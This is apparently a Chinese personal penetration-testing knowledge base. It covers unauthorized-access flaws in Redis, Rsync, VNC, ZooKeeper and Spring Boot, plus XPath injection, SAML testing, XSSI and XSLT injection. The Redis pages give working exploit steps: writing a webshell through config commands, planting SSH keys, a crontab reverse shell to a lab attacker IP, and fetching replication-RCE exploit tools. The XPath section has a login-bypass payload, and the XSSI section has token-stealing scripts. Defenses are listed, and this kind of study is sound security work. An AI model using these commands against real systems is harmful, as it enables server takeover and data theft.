卸载目录 修复：在/etc/exports下对所需要共享的文件进行访问控制 /home export 172.19.104.6(rw,async,no_root_squash) #仅允许172.19.104.6访问该目录。 Redis 端口：6379 介绍：Redis 低版本默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。 利用方式： 写文件 写公钥 写计划任务 写webshell 主从复制RCE 使用工具 MSF https://github.com/Ridter/redis-rce https://github.com/n0b0dyCN/redis-rogue-server 修复：参考 Redis 密码设置和查看密码 其他： Redis常见漏洞利用方法总结|Redis未授权访问漏洞利用方式 漏洞信息 (1) 漏洞简述Redis 是一个高性能的 Key – Value 数据库。Redis 的出现很大程度上弥补了 memcached 这类 Key/Value 存储的不足在部分场合可以对关系数据库起到很好的补充作用。Redis 默认情况下会绑定在 0.0.0.0:6379这样会将 Redis 服务暴露到公网上。在没有开启认证的情况下会导致任意用户在可以访问目标服务器的情况下未经授权就访问到 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法成功地在 Redis 服务器上写入公钥进而可以使用对应私钥直接登录目标服务器。 (2) 风险等级高风险。 (3) 漏洞编号无。 (4) 影响范围Redis 数据库。 检测方法 先用 nmap 扫描查看端口开放情况发现开放的 6379 端口为 Redis 的默认端口 Nmap -A -p 6379 --script redis-info 192.168.10.153 Nmap 扫描后发现主机的 6379 端口对外开放可以通过 Redis 客户端进行连接测试是否存在未授权访问漏洞具体命令如下 ./redis-cli -h 192.168.10.153 Info 就可以看到 Redis 的版本和服务器上内核的版本信息也可以 del key 删除数据在网站写入木马写入 SSH 公钥或者在 crontab 里写定时任务反弹 shell 等。 (1) 网站写码 ① 先用客户端连接服务器的 redis 服务 redis-cli.exe -h 目标IP ② 连接后设置目录 config set dir /var/www/html此路径是服务器端 Web 网站的目录 ③ 设置要写入的文件名 config set dbfilename redis88.php ④ 设置要写入的内容 set webshell \"\" ⑤ 保存 save ⑥ 保存后用菜刀连接此木马得到 webshell。 (2) 结合 SSH 免密码登录 ① 先在本地建个 ssh 的密钥 ssh-keygen-trsa ② 将公钥的内容写到一个文本中命令如下 (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") > test.txt 注意写到文件中时一定要在前面加几行后面加几行。 ③ 将里面的内容写入远程的 Redis 服务器上并且设置其 Key 为 test命令如下 cat test.txt | redis -cli -h -x set test ④ 登录远程服务器可以看到公钥已经添加到 Redis 的服务器上了命令如下 redis-cli -h keys * get test ⑤ 随后就是最关键的了Redis 有个 save 命令save 命令执行一个同步保存操作将当前 Redis 实例的所有数据快照snapshot以 RDB 文件的形式保存到硬盘。所以save 命令就可以将 test 里的公钥保存到 /root/.ssh 下要有权限。 修改保存的路径为 config set dir \"/root/.ssh\" 修改文件名为 config set dbfilename \"authorized_keys\" 保存。 ⑥ 测试一下 ssh 用户名@ 实现免密码成功登陆。 修复方法 (1) 设置 Redis 访问密码在 redis.conf 中找到 “requirepass” 字段在后面填上强口令redis 客户端也需要此密码来访问 redis 服务。 (2) 配置 bind 选项限定可以连接 Reids 服务器的 IP并修改默认端口 6379。 (3) 重启 Redis 服务。 (4) 清理系统中存在的后门木马。 Rsync 漏洞信息 (1) 漏洞简述：Rsync（remote synchronize）是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件，也可以同步本地硬盘中的不同目录。Rsync 默认允许匿名访问，如果在配置文件中没有相关的用户认证以及文件授权，就会触发隐患。Rsync 的默认端口为 837。 (2) 风险等级：高风险。 (3) 漏洞编号：无。 (4) 影响范围：Rsync 全版本。 检测方法 nmap 扫描：nmap ip -p837。 列出当前目录，显示用户：rsync ip。 如果是root，可以下载任意文件并上传文件。 修复方法 (1) 隐藏 module 信息：修改配置文件 list =false。 (2) 权限控制：不需要写入权限的 module 的设置为只读 Read only = true。 (3) 网络访问控制：使用安全组策略或白名单限制，只允许必要访问的主机访问：hosts allow = 123.123.123.123。 (4) 账户认证：只允许指定的用户利用指定的密码使用 rsync 服务。 (5) 数据加密传输：Rsync 默认没有直接支持加密传输，如果需要 Rsync 同步重要性很高的数据，可以使用 ssh。 SpringBoot 端口：80、8080、6080等web端口 介绍：SpringBoot，web中env路径配置文件未授权访问，可能暴露大量联动设备密码信息，甚至RCE 使用工具： 浏览器直接访问 https://github.com/rabbitmask/SB-Actuator 修复：参考 Spring Boot Actuator从未授权访问到getshell VNC 端口：5900-5905 介绍：vnc用于远程桌面控制，未授权访问会导致恶意用户直接控制受控主机 使用工具：VNCview 修复：配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码 漏洞信息 (1) 漏洞简述VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重。 (2) 风险等级高风险。 (3) 漏洞编号无。 (4) 影响范围VNC 全版本。 检测方法 使用 metasploit 进行批量检测 (1) 在 kali 下运行 msfconsolemsfconsole。 (2) 调用 VNC 未授权检测模块use auxiliary/scanner/vnc/vnx_none_auth。 (3) 显示有哪些选项show options。 (4) 设置地址段set rhosts ip 或 段。 (5) 设置线程set threads 50。 (6) 开始扫描run。 修复方法 (1) 配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码。 (2) 以最小权限的普通用户身份运行操作系统。 ZooKeeper 端口：2181、2182 介绍：可读取敏感信息，或者在Zookeeper集群内执行kill命令 使用工具：netcat 修复： 1、修改 ZooKeeper 默认端口，采用其他端口服务。 2、添加访问控制，配置服务来源地址限制策略。 3、增加 ZooKeeper 的认证配置。 漏洞信息 (1) 漏洞简述ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务是 Google 的 Chubby 一个开源的实现是 Hadoop 和 Hbase 的重要组件。它是一个为分布式应用提供一致性服务的软件提供的功能包括配置维护、域名服务、分布式同步、组服务等。ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境。这将导致任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。 (2) 风险等级高风险。 (3) 漏洞编号无。 (4) 影响范围Zookeeper 全版本。 检测方法 (1) 通过 nmap 扫描开放了 2181 端口的主机。 (2) 运行脚本通过 socket 连接 2181 端口并发送 envi 命令若服务端返回的数据中包含 ZooKeeper 的服务运行环境信息即可证明存在未授权访问。 检测脚本 # coding=utf-8 import socket import sys def check(ip, port, timeout, cmd): try: socket.setdefaulttimeout(timeout) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip, int(port))) s.send(cmd) data = s.recv(1024) s.close() print data except: pass def main(): if len(sys.argv) 修复方法 (1) 修改 ZooKeeper 默认端口，采用其他端口服务，配置服务来源地址限制策略。 (2) 增加 ZooKeeper 的认证配置。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-14 09:55:53 "},"个人知识库/01.渗透测试/02.WEB漏洞/06.未授权访问/02.Redis未授权访问漏洞利用.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/06.未授权访问/02.Redis未授权访问漏洞利用.html","title":"02.Redis未授权访问漏洞利用","keywords":"","body":" 危害 环境准备 信息泄露 数据泄露 系统信息泄露 写文件GetShell 在Web目录中写入webshell 环境搭建 getshell 写入SSH公钥直接连接 在本地生成公钥和私钥 将公钥写入文件中 ssh 连接 写入计划任务(corntab)反弹shell 注意⚠️ 执行命令 攻击🐔开启监听 等待 1 分钟 前期总结 高级利用 主从复制Getshell 介绍 环境搭建 漏洞利用 下载Exp 下载 exp.so 利用 成功截图 漏洞原理 模块加载执行命令 介绍 什么时候用 exp.so 复现 防护 参考 危害 信息泄露 系统信息 redis保存的信息 写文件GetShell 在Web目录中写入webshell 写入SSH公钥直接连接 写入计划任务(corntab)反弹shell 高级利用 主从复制getshell（4.x version 模块加载执行命令（> 4.x） 环境准备 🐔型 ip 服务 版本 攻击🐔 192.168.1.100 Windows 10 攻击🐔 192.168.1.100 redis-cli 3.0.501 受害🐔 192.168.1.105 Ubuntu 16.04 LTS 受害🐔 192.168.1.105 redis-server 3.0.6 受害🐔 192.168.1.105 Apache 2.4.18 (Ubuntu) 因为新版的 redis 默认绑定的地址为 127.0.0.1，所以为了复现漏洞，我们手动将绑定端口改成0.0.0.0 sudo vim redis.conf 将 69 行的 127.0.0.1 修改为 0.0.0.0 启动redis必须使用 root 权限启动，否则save时会报错 # 关闭 redis 服务 sudo service redis-server stop # 打开 redis 服务 cd /usr/bin/ && sudo redis-server 信息泄露 数据泄露 获取所有的key值 keys * 具体查看数据可以查看redis教程 http://www.runoob.com/redis/redis-tutorial.html 系统信息泄露 info 命令 可以看到redis的版本、系统内核版本、配置文件路径等信息 写文件GetShell 在Web目录中写入webshell 前提条件 已知网站目录的绝对路径，并且具有读写权限 环境搭建 启动apache服务器 sudo service apache2 start 查看apache服务器状态 sudo service apache2 status 有一个 running 则说明在运行状态 getshell 写入shell # 写入一个string内容 set shell \"\" # 设置备份目录 config set dir /var/www/html/ # 设置备份文件名 config set dbfilename shell.php # 保存文件到本地 save 菜刀连接 写入SSH公钥直接连接 本地生成公钥和私钥 将公钥写入到目标的.ssh文件夹 ssh 连接 在本地生成公钥和私钥 PS : 这里为了方便，我直接从受害🐔里面生成的公钥和私钥，然后再将他们剪切到攻击🐔 ssh-keygen -t rsa 将公钥写入文件中 # 备份文件目录设置为对应的 .ssh，部分为 /root/.ssh/ config set dir /home/lynn/.ssh/ config set dbfilename authorized_keys # 保存key的时候加上两个`\\n`是为了避免和Redis里其他缓存数据混合 set key \"\\n\\n\\生成的公钥n\\n\" save ssh 连接 ssh -i id_rsa lynn@192.168.1.105 可以看到不需要输入密码直接连接 写入计划任务(corntab)反弹shell 注意⚠️ 这里有一个很深的坑，那就是 crontab反弹debain,ubuntu都不行，因为他们对计划任务的格式很严格，必须要执行 crontab -u root /var/spool/cron/crontabs/root 通过语法检查后，才能执行计划任务。 因为这个坑，用了整整一天的时间来研究这个 参考文章 http://www.freebuf.com/vuls/148758.html 主要是感谢下方的评论 执行命令 和写入公钥一样，将文件保存到本地，备份文件名必须要和用户的名字一样，比如是 lsa 那么备份文件就是 lsa set shell \"\\n\\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.1.100/1234 0>&1\\n\\n\" config set dir /var/spool/cron/crontabs/ config set dbfilename root save 攻击🐔开启监听 nc -lvp 1234 等待 1 分钟 等待一分钟受害🐔即可执行任务，攻击🐔就可以收到shell 前期总结 redis未授权访问总的来说危害还是挺大的 但是实际过程中还是会遇到很多很多的问题 比如 redis数据量稍微大一点，写shell到文件之后，php因为文件太大是会拒绝执行的 redis写入的时候就会覆盖passwd，而且passwd不能恢复 debian,ubuntu 计划任务的限制很严格，写入成功是不能执行的 高级利用 主从复制Getshell 介绍 Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。 默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。 主从复制RCE主要原理就是：攻击机通过协议认证成为主节点，目标redis服务器为从节点，通过全量复制将文件内容输出到目标服务器上(也就是写入so文件)。然后加载.so文件，完成命令执行。 环境搭建 采用docker拉取redis进行一键式搭建 docker run -p 6378:6379 -d redis:latest 漏洞利用 下载Exp git clone https://github.com/Ridter/redis-rce.git 下载 exp.so # 下载后放到 redis-rce 目录下 wget --no-chck-certificate https://github.com/n0b0dyCN/redis-rogue-server/raw/master/exp.so 利用 # 此处可以通过 -p 去设置目标端口（默认6379） python redis-rce.py -r -L -P -f exp.so 成功截图 漏洞原理 Pavel Toporkov在2018年的zeronights会议上，分享了关于这个漏洞的详细原理。 PDF链接：https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf 看了个大概，也不是完全懂，大概意思就是说，我们做主机，目标做从机，当两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载so文件，我们就可以执行拓展的新命令了。 模块加载执行命令 介绍 和主从复制差不多，都是加载一样的so文件，只不过这边是直接模块导入的方法 在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。 主要过程还是通过某种手法上传.so文件，然后通过redis的module命令进行加载.so文件，然后进行系统命令执行，这里主要是讲解利用方式，我就不对.so文件原理进行一个讲解。 什么时候用 实战中这种用法一般用在getshell后，上传.so文件进行一个命令执行； 版本够，但是不能用主从复制rce的时候用，不能出网的时候用； exp.so 下载后自己make编译即可 https://github.com/n0b0dyCN/RedisModules-ExecuteCommand fork 复现 启动redis容器 docker run -it --rm -d -p 127.0.0.1:6379:6379 redis 查看版本，符合要求 下载远程的仓库进行编译 git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git cd RedisModules-ExecuteCommand make 把编译好的so文件放到redis的容器内 docker cp 加载so，执行命令 防护 从上面的利用也可以看的出来，防护主要针对以下几点： 禁止未授权访问，设置密码 低权限运行，避免RCE等 禁止数据库对外开放，设置访问IP白名单 参考 redis数据库在渗透中的利用 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-14 09:55:53 "},"个人知识库/01.渗透测试/02.WEB漏洞/07.XPATH注入/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/07.XPATH注入/","title":"07.XPATH注入","keywords":"","body":" 简介 XPath语法 攻击举例 自动化工具 防御 参考 简介 XPath 是一门在 XML 文档中查找信息的语言。 XPath注入也是注入，也是输入一些恶意的查询等代码字符串，从而对网站进行攻击。 XPath注入攻击是指利用XPath解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。 遇到的常见比较少，感觉几乎没人这样做。。。 XPath语法 XPath教程 攻击举例 XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作。 下面以登录验证中的模块为例，说明XPath注入攻击的实现原理。 在 Web 应用程序的登录验证程序中，一般有用户名（username）和密码（password） 两个参数，程序会通过用户所提交输入的用户名和密码来执行授权操作。 若验证数据存放在XML文件中，其原理是通过查找user表中的用户名（username）和密码（password）的结果来进行授权访问， 例存在user.xml文件如下： Ben Elmore abc test123 Shlomy Gantz xyz 123test 则在XPath中典型的查询语句如下： //users/user[loginID/text()='xyz'and password/text()='123test'] 如果我们输入的用户名和密码，闭合了单引号，然后构造一些用为真的语句，那么就可以造成XPath注入攻击； 实施注入攻击，绕过身份验证，举例代码如下： 'or 1=1 or ''=' 合并一下： //users/user[loginID/text()=''or 1=1 or ''='' and password/text()='' or 1=1 or ''=''] 自动化工具 xcat 防御 参数化 数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证 检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串 对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息 通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息 参考 安全测试之XPath注入攻击 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 15:12:17 "},"个人知识库/01.渗透测试/02.WEB漏洞/08.SAML测试/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/08.SAML测试/","title":"08.SAML测试","keywords":"","body":" 介绍 什么是SSO SAML简述 测试技巧 消息到期 重复请求消息 签名 来自不同收件人的 SAML（感觉像一个token多用） XML 外部实体（XXE） 利用SAML漏洞 SAML Raider 总结 参考文档 介绍 这次我们来分享一些可用于测试基于 SAML 的 SSO 的方法。 现在很多 SSO 都使用 SAML 作为身份验证过程的一部分，在正常情况下是不会引起安全问题的，但是当 SSO 的配置出错时就可能会导致较大危害。 什么是SSO SSO 是 Single Sign On 的简称，其定义是在多个应用系统中，用户只需要登陆一次就可以访问所有互相信任的应用系统，简单说就是，一些有关联的网站通常会共享用户信息， 那么用户只需要注册一个账号， 就可以对所有相关联的网站使用该账户来进行登录操作。比如说 Google，你可以使用 Google 账户去登陆 GMail, Blogger, iGoogle 等多个应用。 SAML简述 SAML-安全声明标记语言，是一个XML框架，也是一组协议和规范，用于在不同的安全域之间交换认证和授权数据。SAML标准定义了身份提供者(IP)和服务提供者(SP)，这两者构成了前面所说的不同的安全域。 比如，两台远程机器之间要通讯，为了保证安全，我们可以采用加密等措施，也可以采用SAML来传输，传输的数据使用符合SAML规范的XML格式，这样我们就可以不要求两台机器采用什么样的系统，只要求能理解 SAML 规范即可。 SAML 主要包括三个方面： 认证申明：表明用户是否已经认证，通常用于SSO。 属性申明：表明某个Subject的属性。 授权申明：表明某个资源的权限。 传统的应用程序可以在允许用户访问之前会进行检验。但在基于 SAML 的 SSO 模型中， 认证功能被移动到执行认证的外部身份提供者（IP）应用程序中。如下图所示： 由上图可以看到 IP、SP和用户三者之间的关系。 用户通过浏览器向IP发送发送请求，IP进行身份验证，验证成功之后将数据采用SAML传输回来， 浏览器再将这个数据转发给SP，让用户成功登陆，并且让IP和SP之间建立信任关系。在传递数据的时候必须通过用户的浏览器，这为用户提供了修改信息的机会，这是一个可以利用的点。 SAML数据是由base64编码的，其中最容易被篡改的两个最常见的区域就是签名和断言。签名可以让 IP 和 SP 之间产生信任关系，断言则使 SP 执行信任操作，允许您以特定用户身份访问应用程序。 测试技巧 消息到期 SAML 消息应包含发出请求的时间、过期时间。如果 SAML 消息永远不会过期，或者到期不被执行，那么会存在信息落入攻击者手中的风险。所以在测试时。可以检查消息的时间戳，例如 IssueInstant 或 NotOnOrAfter 断言。发出请求之后，暂停请求，直到到期结束再允许请求通过 SP ，同时还要确保到期窗口是合理的，比如1-5分钟。 重复请求消息 断言应包含只能被应用程序接受一次的唯一 ID。所以我们可以尝试重复请求SAML 消息以创建多个会话。 签名 在邮件缺少签名的情况下，可以篡改 SP 应用程序的权限。（签名是否必须，saml raider 中 remove sigatures） 签名是否经过验证（要测试一个签名是否有效，方法很简单。我们可以在已签名的内容中修改一些地方，并观察是否会导致中断） 当 CA 证书是属于自签名的时候，可以选择克隆证书或者创建证书来达到替换原来证书的目的。（签名是否来自正确的签署人？saml raider 中 send certificate to SAML Raider Certs) 是否已经对响应中正确的部分进行签名？（XSW，我们就可以将签名引用到文档的不同位置，并且让接受者认为签名是有效的。） 来自不同收件人的 SAML（感觉像一个token多用） 应用程序应仅接受用于 SP 应用程序的 SAML 消息。如果应用程序不执行此检查，它可能会对从另一个应用程序进行身份验证，并对生成的 SAML 消息进行备份，允许您从其他应用程序以用户身份进入该应用程序。如果您成功登录了使用相同 IP（外部身份提供者）的其他应用程序，在登录之后记录消息，然后将记录的消息重新发送到您的目标 SP。 XML 外部实体（XXE） SAML 消息只是由服务提供商处理用户提供的 XML 消息。确保检查所有标准的 XML 攻击向量。XXE 是一种非常普遍的 XML 攻击，可以通过 SAML 消息找到它。 利用SAML漏洞 一些攻击，例如重新请求过期消息或重新请求另一个应用程序的消息，是可以产生一定的效果的。上述大多数漏洞是允许修改断言的，这需要充分利用所发现的漏洞。如果您能够以发送自己的断言的方式篡改 SAML 消息，试试以下操作： 更改过期邮件的有效期，使其再次生效 将 UserId 更改为不同的有效用户 - 如果可以更改为管理员的用户，就相当有趣了 将 UserId 更改为无效用户 - 有时，应用程序将会向无效用户授予默认权限或更高权限 SAML Raider ​ 用于测试 SAML 的一个非常有用的工具是 Burp Suite 的 SAML Raider 扩展。它自动突显包含SAML 消息的代理请求，并向已解码的有效载荷添加代理选项卡。SAML Raider 还向 Repeater添加了一个窗格，允许您快速发布受欢迎的签名包装（XSW）攻击。最后，SAML Raider 添加了一个 Certs 选项卡，使克隆证书变得容易。您可以直接克隆证书或创建证书的自签名版本。可以参考这篇文章：Bypassing SAML 2.0 SSO with XML Signature Attacks 总结 ​ SAML 的安全性是 SSO 应用领域中经常被忽视的地方。成功的 SAML 攻击会导致严重的漏洞，例如重新请求会话，获得访问未经授权的应用程序的权限。攻击 SAML 有很多手段，但SAML Raider 等工具可以帮助检测和利用常见的 SAML 问题。所以你可以通过使用这些工具，进行检测，从而去避免自己的应用程序被攻击。 参考文档 Bypassing SAML 2.0 SSO with XML Signature Attacks 通过XML签名攻击绕过SAML2.0单点登录 基于 SAML 的 SSO 的测试小思路 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-14 09:55:53 "},"个人知识库/01.渗透测试/02.WEB漏洞/09.XSSI/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/09.XSSI/","title":"09.XSSI","keywords":"","body":" 简介 原理 利用场景 攻击利用 针对JavaScript文件 静态JavaScript文件 动态JavaScript文件 插曲 直接调用相关函数 重写调用函数 重写原型链 针对非JavaScript类型文件 XSSI与XSS、CSRF、XS-Leak的区别 防御 参考 简介 XSSI（Cross Site Script Inclusion）跨站脚本包含是一种允许攻击者通过嵌入script标签的src属性来加载敏感js绕过边界窃取信息的漏洞。 简单来讲，就是攻击者通过使用标签跨域包含特定文件/页面，就可以窃取符合JavaScript格式的文件中的敏感信息。 举例如下： #!javascript 原理 先来简单了解下什么是同源策略： 同源策略SOP（Same origin policy）是一种约定，也是浏览器最核心也最基本的安全功能，它限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 如果两个 URL 的 protocol、port (如果有指定的话)和 host 都相同的话，则这两个 URL 是同源。这个方案也被称为“协议/主机/端口元组”，或者直接是 “元组”。（“元组” 是指一组项目构成的整体，双重/三重/四重/五重/等的通用形式）。 下表给出了与 URL http://store.company.com/dir/page.html 的源进行对比的示例: URL 结果 原因 http://store.company.com/dir2/other.html 同源 只有路径不同 http://store.company.com/dir/inner/another.html 同源 只有路径不同 https://store.company.com/secure.html 失败 协议不同 http://store.company.com:81/dir/etc.html 失败 端口不同 ( http:// 默认端口是80) http://news.company.com/dir/other.html 失败 主机不同 而XSSI的核心就是绕过了SOP来跨域包含含有敏感信息的外域文件，因为默认情况下不允许加载外域文件，而通过script标签是允许跨域加载资源的，如果某个网站的动态JS脚本、文件和响应中包含某些敏感信息，那么就存在信息泄漏的风险。 与其说是绕过SOP，个人感觉更像是利用了script标签的跨域特性。。。 利用场景 用户登录正常的网站A，网站A会给用户分配Cookie用于鉴权 用户访问攻击者构造的恶意页面B，页面包含有script标签，且src属性为网站A中含有敏感信息的JS文件或者特定页面（返回类型必须能被script识别解析） 攻击者可以从下载的动态JS文件中获取用户的敏感信息 攻击利用 因为XSSI主要是通过script标签加载目标的敏感文件，再从敏感文件中获取信息；而敏感文件主要分为两类，分别是： JavaScript文件 静态JS文件（需要登陆后才能访问的，不然可以直接访问，没意义） 动态JS文件 非JavaScript文件（比较鸡肋） CSV文件 JSON文件 针对JavaScript文件 静态JavaScript文件 这里遇到的情况相对较少，因为静态的JavaScript文件不登陆的情况下大多都是可以访问的，很少出现必须要登录才能访问的情况；如果不登陆的情况下都可以访问，那用了XSSI反而是多此一举。 敏感JS文件 var username = \"admin\"; var password = \"admin888\"; XSSI利用代码 d4m1ts document.write(\"用户名：\" + username); document.write(\"\"); document.write(\"密码 ：\" + password); 动态JavaScript文件 这种情况就比较多了，一般都是需要登陆后才能访问的，且通常包含有敏感信息，适合用来进行XSSI攻击 插曲 Q：如何判断一个JS是不是动态的 A1：用多个账号分别访问这个JS，看看返回的内容是不是一样的 A2：使用burp插件：DetectDynamicJS 直接调用相关函数 敏感动态JS（动态生成token） function getToken(){ len = 16 || 32; var $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'; var maxPos = $chars.length; var token = ''; for (i = 0; i XSSI利用代码（直接调用getToken()函数） d4m1ts var token = getToken(); document.write(\"Token is : \" + token); 重写调用函数 敏感动态JS (function(){ var token = getToken(); doSomeThing(token); })(); function getToken(){ len = 16 || 32; var $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'; var maxPos = $chars.length; var token = ''; for (i = 0; i XSSI利用代码（重写doSomeThing(token)方法） d4m1ts function doSomeThing(token){ document.write(\"Token: \" + token); } 重写原型链 如果调用敏感数据的函数是内置的方法，比如String类型的内置方法split()、trim()、search()等，这些函数肯定是不能被直接重写的，但是我们可以通过重写原型链的方法来重写对应的内置函数。（还是重写方法。。。） 敏感动态JS (function(){ var token = getToken(); token.split(\"\"); })(); function getToken(){ len = 16 || 32; var $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz012345678'; var maxPos = $chars.length; var token = ''; for (i = 0; i XSSI利用代码（重写String原型链中的split()方法） d4m1ts String.prototype.split = function(){ document.write(this.toString()); } 针对非JavaScript类型文件 主要是利用IE的各种bug问题，而现在几乎很少有人使用IE了，算是比较鸡肋吧。。。 在chrome和firefox中已经不存在这个问题了 具体原因如下： 有兴趣可以参考：XSSI攻击利用 - 大学生，原理也很简单 XSSI与XSS、CSRF、XS-Leak的区别 相同点：四者均为Web前端安全漏洞，都需要用户交互才能触发。 不同点： XSS是在受害者html页面中注入恶意代码执行恶意操作，例如窃取已登录用户的cookie信息； CSRF是通过诱使受害者访问恶意页面导致向目标页面发起请求，在受害者已登录的目标页面中执行恶意动作，例如提交修改用户密码的表单操作； XS-Leaks是用于具有模糊查询的功能，请求结果只会返回两种有差异的结果，然后根据这些差异推断出用户的敏感信息； XSSI是通过script标签的src属性来跨域包含含有敏感数据的文件来窃取敏感信息的； 防御 开发者永远也不要把敏感数据放在JavaScript文件中， 也不要放在JSONP中； 请求敏感文件/响应的尽量改为POST方式； 使用类似于CSRF-Token机制； 设置响应头为X-Content-Type-Options: nosniff，此时浏览器就会拒绝加载JS类型的数据； 参考 浅析XSSI漏洞 Web安全之XSSI漏洞 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-08 15:12:17 "},"个人知识库/01.渗透测试/02.WEB漏洞/10.XSLT/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/10.XSLT/","title":"10.XSLT","keywords":"","body":" XSLT简介 XSLT举例 判断漏洞 攻击 system-property()函数和指纹 使用document()进行XML文件读取+端口扫描 嵌入脚本区块执行远程代码 JAVA RCE import和incldue 安全建议 参考 XSLT简介 XSL(可扩展样式表语言)是一种用于转换XML文档的语言，XSLT表示的就是XSL转换，转换后得到的一般都是不同的XML文档或其他类型文档，例如HTML文档、CSV文件以及明文文本文件等等。 一般来说，应用程序或模板引擎在处理不同文件类型时需要使用XSLT来进行数据转换。很多企业级应用比较喜欢使用XSLT，比如说，多用户发票应用程序可以使用XSLT来允许客户自定义它们的发票，客户可以根据自己的需求来修改发票信息以及格式。 其他常见应用： 报告功能 多种格式的数据导出功能; 数据打印和输出功能; 电子邮件; XSLT举例 个人理解，就是给XML美化生成其他文档的东西 xsl文件（可以理解为美化模板） xml文件（待美化的内容） 结合 最终美化效果 判断漏洞 可以通过注入导致错误XML语法的字符（比如双引号、单引号、尖括号）的方法。如果服务器返回了错误，那么应用则可能易受攻击。总的来说，这种识别技术和XML注入漏洞识别技术是相同的。 攻击 XSLT注入，就是XLS模版文件内容可控，从而操作一些函数导致可以造成其他的危害 system-property()函数和指纹 我们可以通过system-property()函数来获取库发布者的名字，该函数是XSLT v1.0d的标准，所以所有的库都实现了这一点。 正确有效的参数是： xsl: vendor xsl: vendor-url xsl: version 使用document()进行XML文件读取+端口扫描 document()函数允许XSLT转换获取存储在除了主数据源以外的外部XML文档中的数据。（注意：返回的格式必须是XML才行） 攻击者可以滥用document函数来读取远程系统的文件，通常是以转换结果的整个内容进行拷贝为手段。但这种攻击要求文件是格式工整的XML文档，但这并不总是个问题，因为大多数时候敏感信息总是存储在XML文件中。比如在一个asp.net web应用中，web.config文件就是个很好的例子因为它包含了数据库认证信息。 Fruits: - : document()函数可以用于获取远程系统的文档并且能通过UNC路径或如下所示URL来进行基本的网络扫描： Fruits: - : 嵌入脚本区块执行远程代码 嵌入的脚本区块是专有的XSLT扩展，可以直接在XSLT文档中包含代码。在微软的实现中，可以包含C#代码。当文档被解析，远程服务器会编译然后执行代码。 --- BEGIN COMMAND OUTPUT --- --- END COMMAND OUTPUT --- JAVA RCE xslt处理器如果不禁用，能将本机的java语言方法暴露为XSLT函数，导致任意代码执行漏洞 import和incldue 